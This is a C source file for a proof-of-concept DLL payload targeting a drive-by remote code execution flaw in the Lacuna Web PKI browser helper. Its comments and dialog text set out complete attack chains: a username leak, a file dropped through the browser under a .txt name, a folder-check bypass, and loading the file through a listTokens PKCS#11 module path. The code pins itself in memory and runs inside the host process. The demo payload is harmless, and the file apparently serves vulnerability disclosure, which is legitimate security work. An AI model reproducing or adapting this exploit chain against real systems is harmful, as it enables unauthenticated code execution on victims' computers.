/* PoC payload v2 for Lacuna Web PKI drive-by RCE (post-2.17.5 patch revival).
   Loaded by Lacuna.WebPKI.ChromeWin.exe (x86) via attacker-controlled
   PKCS#11 module path passed in a `listTokens` request from any web origin.

   v2 chain (no downloadToFolder, no WebDAV, no network egress):
     0. generateSoftwareRsaKeyPair  -> response leaks Environment.UserName.
     1. the BROWSER silently downloads this file to %USERPROFILE%\Downloads
        under a benign extension (e.g. evil_v2.txt). LoadLibraryEx ignores
        the extension, so the name does not need to be *.dll.
     2. listTokens { pkcs11Modules:["C:\\Users\\<user>\\Downloads\\evil_v2.txt"] }
        -> LoadLibraryEx -> DllMain in the host, under the victim's account.

   Demo behaviour is identical to v1: drop a marker, pop a system-modal
   dialog from inside the host process, launch Edge. Marker name is
   distinct (lacuna_pwned_v1.txt) so a v2 run is unambiguous.

   All work runs in a worker thread so DllMain returns immediately. */
#include <windows.h>
#include <shellapi.h>

#define VIDEO_URL "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
#define MARKER_NAME "lacuna_pwned_v1.txt"
#define MSG_TITLE "Lacuna Web PKI - RCE PoC v1 (unauthenticated drive-by)"
static const char *MSG_BODY =
    "Code is now executing inside Lacuna.WebPKI.ChromeWin.exe\r\n"
    "as the logged-in user, triggered solely by visiting a web page.\r\n\r\n"
    "v1 chain (unauthenticated drive-by, ext 2.17.0, host 2.14.0):\r\n"
    "  1. DownloadToFolder (capital D bypasses the JS folderId shim)\r\n"
    "       -> arbitrary file write, drops this DLL to %TEMP%\\evil.dll\r\n"
    "  2. listTokens { pkcs11Modules:[<dropped path>] } -> LoadLibrary\r\n\r\n"
    "No license check on either command: ANY web origin works.\r\n"
    "Patched in 2.17.5 (folderId required + license gate).\r\n\r\n"
    "Click OK to launch Edge with the demo video.";

static void marker_path(char *out) {
    DWORD n = GetEnvironmentVariableA("TEMP", out, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) lstrcpynA(out, "C:\\Windows\\Temp", MAX_PATH);
    lstrcatA(out, "\\" MARKER_NAME);
}

static void marker_init(void) {
    char path[MAX_PATH]; marker_path(path);
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    char host[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, host, MAX_PATH);
    char self[MAX_PATH] = {0};
    GetModuleFileNameA(GetModuleHandleA(NULL), self, MAX_PATH);
    char user[256] = {0}; DWORD ulen = sizeof(user);
    GetUserNameA(user, &ulen);
    char buf[1024];
    int n = wsprintfA(buf,
        "Lacuna Web PKI RCE v1 - DllMain executed\r\n"
        "host pid     : %lu\r\n"
        "host module  : %s\r\n"
        "running user : %s\r\n",
        GetCurrentProcessId(), host, user);
    DWORD w = 0; WriteFile(h, buf, n, &w, NULL);
    CloseHandle(h);
}

static void marker_log(const char *line) {
    char path[MAX_PATH]; marker_path(path);
    HANDLE h = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SetFilePointer(h, 0, NULL, FILE_END);
    DWORD w = 0;
    WriteFile(h, line, lstrlenA(line), &w, NULL);
    WriteFile(h, "\r\n", 2, &w, NULL);
    CloseHandle(h);
}

static void launch_edge(void) {
    static const char *paths[] = {
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        NULL
    };
    char log[256];
    const char *exe = NULL;
    for (int i = 0; paths[i]; i++) {
        if (GetFileAttributesA(paths[i]) != INVALID_FILE_ATTRIBUTES) { exe = paths[i]; break; }
    }
    if (exe) {
        char cmd[1024];
        wsprintfA(cmd, "\"%s\" --new-window \"%s\"", exe, VIDEO_URL);
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = {0};
        BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                                 0, NULL, NULL, &si, &pi);
        DWORD gle = GetLastError();
        wsprintfA(log, "  CreateProcess ok=%d gle=%lu", ok, gle);
        marker_log(log);
        if (ok) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return; }
    } else {
        marker_log("  msedge.exe not found at known paths");
    }
    HINSTANCE r = ShellExecuteA(NULL, "open", "msedge.exe", VIDEO_URL, NULL, SW_SHOWNORMAL);
    wsprintfA(log, "  ShellExecute(msedge App Paths) -> %lu", (DWORD)(DWORD_PTR)r);
    marker_log(log);
    if ((INT_PTR)r > 32) return;
    r = ShellExecuteA(NULL, "open", VIDEO_URL, NULL, NULL, SW_SHOWNORMAL);
    wsprintfA(log, "  ShellExecute(URL default) -> %lu", (DWORD)(DWORD_PTR)r);
    marker_log(log);
}

static DWORD WINAPI dialog_thread(LPVOID unused) {
    (void)unused;
    Sleep(6000);
    HWND fg = GetForegroundWindow();
    DWORD fgTid = fg ? GetWindowThreadProcessId(fg, NULL) : 0;
    DWORD myTid = GetCurrentThreadId();
    if (fgTid && fgTid != myTid) AttachThreadInput(fgTid, myTid, TRUE);
    marker_log("[+] showing dialog");
    int r = MessageBoxA(NULL, MSG_BODY, MSG_TITLE,
                        MB_OK | MB_ICONWARNING | MB_TOPMOST |
                        MB_SETFOREGROUND | MB_SYSTEMMODAL);
    if (fgTid && fgTid != myTid) AttachThreadInput(fgTid, myTid, FALSE);
    char b[64]; wsprintfA(b, "[+] dialog returned %d", r); marker_log(b);
    return 0;
}

static DWORD WINAPI worker(LPVOID unused) {
    (void)unused;
    marker_init();
    marker_log("[+] launching Edge");
    launch_edge();
    marker_log("[+] spawning dialog thread");
    HANDLE d = CreateThread(NULL, 0, dialog_thread, NULL, 0, NULL);
    if (!d) {
        char b[80]; wsprintfA(b, "  CreateThread(dialog) failed gle=%lu", GetLastError());
        marker_log(b);
        dialog_thread(NULL);
    } else {
        CloseHandle(d);
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    (void)r;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        /* Pin ourselves: Pkcs11TokenStore.Load() FreeLibrary's us once our
           "module" returns no PKCS#11 entry points. Pinning keeps our code
           mapped while the worker thread runs to completion. */
        HMODULE self = NULL;
        GetModuleHandleExA(
            GET_MODULE_HANDLE_EX_FLAG_PIN |
            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
            (LPCSTR)(void*)&DllMain, &self);
        HANDLE t = CreateThread(NULL, 0, worker, NULL, 0, NULL);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
